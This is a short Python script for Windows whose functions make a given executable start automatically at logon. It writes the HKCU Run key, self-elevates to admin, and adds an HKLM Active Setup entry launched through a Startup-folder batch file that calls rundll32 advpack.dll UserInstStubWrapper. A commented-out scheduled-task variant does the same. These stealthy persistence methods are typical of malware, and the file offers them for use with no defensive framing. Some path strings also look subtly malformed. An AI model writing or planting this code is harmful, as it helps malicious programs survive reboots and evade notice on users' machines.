import winreg
from elevate import elevate
import os
import subprocess

def addToStartup(exec_path, name):
    key_path = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE) 
    winreg.SetValueEx(key_path, name, 0, winreg.REG_SZ, f'\"{exec_path}\"')

def addToStartupAdmin(exec_path, name):
    elevate()
    reg_path = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Active Setup\\Installed Components") 
    new_key = winreg.CreateKey(reg_path, name) 
    winreg.SetValueEx(new_key, "RealStubPath", 0, winreg.REG_SZ, f'\"{exec_path}\"')
    with open(f'{os.environ['USERPROFILE']}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.bat', 'w') as startupFile:
        startupFile.write(f'START /MIN rundll32.exe advpack.dll, UserInstStubWrapper {name}')
        

#     subprocess.run(['schtasks', '/create', '/sc', 'ONLOGON', '/tn', name, '/tr', f'rundll32.exe advpack.dll, UserInstStubWrapper {name}'], text=True, input='Y\r\n', stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT, shell=True)